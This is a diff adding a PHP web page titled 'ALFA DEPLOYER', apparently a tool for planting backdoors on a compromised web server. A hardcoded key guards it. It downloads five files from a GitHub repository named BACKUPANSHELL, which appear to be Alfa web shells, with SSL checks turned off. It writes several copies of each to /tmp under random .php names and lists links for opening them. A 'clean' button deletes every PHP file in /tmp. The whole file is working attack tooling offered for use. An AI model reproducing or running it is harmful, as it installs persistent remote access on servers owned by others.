@@ -1,0 +1,138 @@
+<?php
+// ==========================================
+// SIMPLE ALFA DEPLOYER v1.0
+// ==========================================
+// Akses: ?key=alfamaster
+// ==========================================
+
+$key = isset($_GET['key']) ? $_GET['key'] : '';
+if ($key !== 'alfamaster') die('404 - Not Found');
+
+// ============ SOURCES ============
+$sources = [
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaavataryleh.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfatintin.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerantisession.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt',
+];
+
+// ============ FUNCTIONS ============
+function getContent($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        if ($data && strlen($data) > 100) return $data;
+    }
+    return @file_get_contents($url);
+}
+
+function randomName() {
+    return substr(md5(uniqid()), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
+}
+
+// ============ DEPLOY ============
+$deployed = [];
+foreach ($sources as $src) {
+    $content = getContent($src);
+    if ($content && strlen($content) > 100) {
+        for ($i = 0; $i < 3; $i++) {
+            $name = randomName();
+            $path = '/tmp/' . $name;
+            if (file_put_contents($path, $content)) {
+                chmod($path, 0644);
+                $deployed[] = ['file' => $name, 'source' => basename($src)];
+            }
+        }
+    }
+}
+
+// ============ CLEAN ============
+if (isset($_GET['clean'])) {
+    foreach (glob('/tmp/*.php') as $f) @unlink($f);
+    die("✅ Cleaned all files in /tmp/");
+}
+
+// ============ DOMAIN ============
+$domain = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'];
+$total = count($deployed);
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ALFA DEPLOYER</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;padding:20px}
+        .box{max-width:800px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:8px;padding:20px}
+        h1{color:#00ff00;font-size:22px;margin-bottom:5px}
+        .info{color:#666;font-size:12px;margin-bottom:15px}
+        .stat{display:inline-block;background:#000;padding:5px 15px;border-radius:4px;margin-right:10px}
+        .stat span{color:#00ff00;font-weight:700}
+        .file{background:#000;padding:8px 12px;margin:4px 0;border-radius:4px;border-left:3px solid #00ff00;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
+        .file .name{color:#00ff00}
+        .file .src{color:#666;font-size:11px}
+        .file a{color:#00b8ff;font-size:12px;text-decoration:none}
+        .file a:hover{color:#00ff00}
+        .btn{padding:8px 20px;background:#00ff00;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:'Courier New';text-decoration:none;display:inline-block;font-size:13px}
+        .btn-danger{background:#ff3333;color:#fff}
+        .btn-ghost{background:transparent;border:1px solid #333;color:#666}
+        .mt-10{margin-top:10px}
+        .mb-10{margin-bottom:10px}
+        .flex{display:flex;gap:10px;flex-wrap:wrap}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>⚡ ALFA DEPLOYER</h1>
+    <div class="info">Auto-deploy shells to /tmp/</div>
+    
+    <div class="mb-10">
+        <span class="stat">📦 <span><?= $total ?></span> deployed</span>
+        <span class="stat">📂 <span><?= count($sources) ?></span> sources</span>
+        <span class="stat">🌐 <span><?= $domain ?></span></span>
+    </div>
+    
+    <div class="flex mb-10">
+        <a href="?key=alfamaster" class="btn">🔄 Deploy</a>
+        <a href="?key=alfamaster&clean=1" class="btn btn-danger" onclick="return confirm('Delete all?')">🧹 Clean</a>
+        <a href="?key=alfamaster&list=1" class="btn btn-ghost">📋 List</a>
+    </div>
+    
+    <?php if (isset($_GET['list']) || $total > 0): ?>
+        <hr style="border-color:#1a1a1a;margin:10px 0">
+        <div style="color:#666;font-size:11px;margin-bottom:8px">— ACCESS LIST —</div>
+        
+        <?php if ($total > 0): ?>
+            <?php foreach ($deployed as $f): ?>
+                <div class="file">
+                    <span class="name">📄 <?= htmlspecialchars($f['file']) ?></span>
+                    <span class="src"><?= htmlspecialchars($f['source']) ?></span>
+                    <a href="<?= $domain ?>/tmp/<?= htmlspecialchars($f['file']) ?>" target="_blank">🔗 Open</a>
+                </div>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <div style="color:#666;padding:20px;text-align:center">No files deployed. Click "Deploy" first.</div>
+        <?php endif; ?>
+        
+        <div style="margin-top:10px;background:#000;padding:10px;border-radius:4px;font-size:11px;color:#666;word-break:break-all">
+            <strong>📋 Copy all URLs:</strong><br>
+            <?php foreach ($deployed as $f): ?>
+                <?= $domain ?>/tmp/<?= $f['file'] ?><br>
+            <?php endforeach; ?>
+        </div>
+    <?php endif; ?>
+    
+    <div style="margin-top:15px;color:#444;font-size:10px;border-top:1px solid #1a1a1a;padding-top:10px">
+        ALFA DEPLOYER v1.0 | <?= date('Y-m-d H:i:s') ?>
+    </div>
+</div>
+</body>
+</html>
